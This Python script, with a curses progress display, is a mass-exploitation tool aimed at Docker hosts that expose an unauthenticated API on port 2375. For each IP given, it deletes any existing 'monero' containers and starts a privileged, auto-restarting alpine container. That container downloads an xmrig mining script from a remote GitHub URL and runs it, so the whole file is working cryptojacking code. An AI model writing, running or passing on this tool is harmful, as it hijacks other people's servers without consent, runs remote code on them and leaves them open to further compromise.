import curses
import time
import threading
import requests
import json
import subprocess

SCRIPT_URL = "https://raw.githubusercontent.com/THEV1GILANTE/scripts/refs/heads/main/code/xmrig_alpine.sh"
DOCKER_PORT = 2375

state = {
    "queue": [],
    "running": [],
    "done": [],
    "failed": [],
    "logs": []
}

lock = threading.Lock()

def log(msg):
    with lock:
        state["logs"].append(msg)
        if len(state["logs"]) > 10:
            state["logs"] = state["logs"][-10:]

def parse_ips(raw_input):
    clean_ips = []
    for raw_ip in raw_input.split(","):
        ip = raw_ip.strip()
        ip = ip.replace("http://", "").replace("https://", "")
        ip = ip.split(":")[0]
        if ip:
            clean_ips.append(ip)
    return list(set(clean_ips))

def check_docker_api(ip):
    try:
        url = f"http://{ip}:{DOCKER_PORT}/_ping"
        r = requests.get(url, timeout=3)
        return r.status_code == 200
    except Exception:
        return False

def delete_old_containers(ip):
    try:
        url = f"http://{ip}:{DOCKER_PORT}/containers/json?all=true"
        containers = requests.get(url).json()
        for c in containers:
            name = c["Names"][0]
            if "monero" in name:
                container_id = c["Id"]
                requests.delete(f"http://{ip}:{DOCKER_PORT}/containers/{container_id}?force=true")
                log(f"[{ip}] Deleted container {container_id}")
    except Exception as e:
        log(f"[{ip}] Error deleting containers: {e}")

def start_container(ip):
    try:
        # Create container
        data = {
            "Image": "alpine:latest",
            "Cmd": [
                "/bin/sh", "-c",
                f"apk add --no-cache curl && curl -sSL {SCRIPT_URL} -o run.sh && chmod +x run.sh && ./run.sh {ip}"
            ],
            "HostConfig": {
                "Privileged": True,
                "RestartPolicy": {"Name": "unless-stopped"}
            },
            "Tty": True,
            "name": f"monero_{ip.replace('.', '_')}"
        }

        create_url = f"http://{ip}:{DOCKER_PORT}/containers/create"
        r = requests.post(create_url, data=json.dumps(data), headers={"Content-Type": "application/json"})
        container_id = r.json().get("Id")

        if not container_id:
            log(f"[{ip}] Container creation failed")
            state["failed"].append(ip)
            return

        # Start container
        start_url = f"http://{ip}:{DOCKER_PORT}/containers/{container_id}/start"
        requests.post(start_url)

        log(f"[{ip}] Mining container started: {container_id[:12]}")
        state["done"].append(ip)

    except Exception as e:
        log(f"[{ip}] Error: {e}")
        state["failed"].append(ip)
    finally:
        if ip in state["running"]:
            state["running"].remove(ip)

def process_ip(ip):
    with lock:
        state["running"].append(ip)
    if not check_docker_api(ip):
        log(f"[{ip}] Docker API not reachable.")
        state["failed"].append(ip)
        with lock:
            state["running"].remove(ip)
        return
    delete_old_containers(ip)
    start_container(ip)

def draw_ui(stdscr):
    curses.curs_set(0)
    stdscr.nodelay(True)

    while True:
        stdscr.clear()
        height, width = stdscr.getmaxyx()

        def draw_box(title, items, x, y, w):
            stdscr.addstr(y, x, f"┌─ {title} {'─' * (w - len(title) - 5)}┐")
            for idx, item in enumerate(items[:10]):
                stdscr.addstr(y + idx + 1, x, f"│ {item[:w-4]:<{w-4}} │")
            for i in range(len(items), 10):
                stdscr.addstr(y + i + 1, x, f"│ {' ' * (w-4)} │")
            stdscr.addstr(y + 11, x, f"└{'─' * (w - 2)}┘")

        box_width = width // 3 - 2
        draw_box("Queued", state["queue"], 1, 1, box_width)
        draw_box("Running", state["running"], box_width + 2, 1, box_width)
        draw_box("Done/Failed", state["done"] + state["failed"], 2*box_width + 3, 1, box_width)

        # Verbose log
        stdscr.addstr(14, 0, "─" * width)
        stdscr.addstr(15, 1, "Logs:")
        for i, msg in enumerate(state["logs"][-5:]):
            stdscr.addstr(16 + i, 1, msg[:width - 2])
        stdscr.refresh()
        time.sleep(0.5)

def input_ips():
    raw_input = input("Enter Docker Host IPs (comma-separated): ")
    state["queue"] = parse_ips(raw_input)

def main():
    input_ips()
    ui_thread = threading.Thread(target=curses.wrapper, args=(draw_ui,))
    ui_thread.daemon = True
    ui_thread.start()

    while state["queue"]:
        ip = state["queue"].pop(0)
        t = threading.Thread(target=process_ip, args=(ip,))
        t.start()
        time.sleep(1)

    while threading.active_count() > 1:
        time.sleep(1)

if __name__ == "__main__":
    main()

